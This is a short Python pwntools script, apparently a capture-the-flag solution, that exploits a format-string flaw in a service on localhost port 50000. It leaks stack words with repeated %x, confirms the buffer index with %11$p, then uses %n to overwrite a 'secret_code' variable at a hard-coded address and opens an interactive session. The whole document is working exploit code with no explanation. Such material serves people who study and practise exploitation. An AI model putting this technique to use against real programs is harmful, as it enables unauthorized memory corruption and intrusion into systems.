from pwn import *

# Bruteforce the index of the buffer

conn = remote("localhost", 50000)
print(conn.recv())

conn.send("I am not a robotBBAAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x\r\n")

print(conn.recv())

# Check the index of the buffer

conn = remote("localhost", 50000)
print(conn.recv())

conn.send(b"I am not a robotBBAAAA%11$p\r\n")
print(conn.recv())

# Overwrite the secret_code address

conn = remote("localhost", 50000)
print(conn.recv())

conn.send(b"I am not a robotBB\xbc\xff\x0d\x08%168x%11$n\r\n") # 080dffbc
print(conn.recv())
conn.interactive()
